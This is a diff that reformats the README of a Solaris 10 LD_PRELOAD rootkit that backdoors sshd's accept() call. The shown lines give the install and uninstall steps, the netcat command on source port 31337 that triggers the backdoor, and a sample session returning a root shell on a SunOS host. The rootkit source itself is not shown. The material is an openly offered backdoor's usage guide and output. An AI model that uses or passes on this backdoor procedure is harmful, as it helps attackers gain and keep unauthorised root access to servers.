@@ -1,4 +1,4 @@
-Solaris 10.x LD_PRELOAD sshd accept() rootkit
+#Solaris 10.x LD_PRELOAD sshd accept() rootkit
 
 By: c papathanasiou  
 
@@ -21,7 +21,7 @@ To uninstall -> `make clean`
 To come in via the backdoor -> `nc -v -p 31337 remote-host 22`
 
 
----------------------------------------------------------------------
+```
 
 # make all
 
@@ -47,9 +47,9 @@ bash-3.00# uname -a
 uname -a
 SunOS unknown 5.10 Generic_137138-09 i86pc i386 i86pc
 bash-3.00#
-
+```
 To uninstall: 
-
+```
 # make clean
 Restarting ssh daemon...
 rootkit removed..
@@ -58,7 +58,7 @@ localhost [127.0.0.1] 22 (ssh) open
 SSH-2.0-Sun_SSH_1.1
 ^CExiting.
 #
-
+```
 
 ---------------------------------------------------------------------
 References:
